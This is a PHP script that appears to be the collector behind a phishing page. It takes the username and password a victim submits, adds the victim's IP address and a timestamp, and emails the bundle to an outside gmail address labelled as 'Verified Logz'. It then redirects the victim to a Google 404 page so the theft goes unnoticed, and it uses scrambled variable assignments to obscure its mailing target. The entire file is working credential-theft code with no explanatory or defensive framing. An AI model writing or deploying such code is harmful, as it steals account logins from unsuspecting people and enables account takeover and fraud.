<?

$adddate=date("D M d, Y g:i a");
$mesaegs ="php_info";$mesaegs ="@";
$ip = getenv("REMOTE_ADDR");
$mesaegs ="ymail";$mesaegs  =".com";
$message .= "---------=RiZoRT=---------\n";
$message .= "Online ID: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['passwd']."\n";
$message .= "---------=IP Adress & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------=D A D D A=---------\n";




$sent ="silversillkjane@gmail.com";




$subject = "H | DADDA Verified Logz";
$headers = "From: Dadda <toolz@daddamgo.lite>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}
header("Location: http://www.google.com/404.htm");
?>
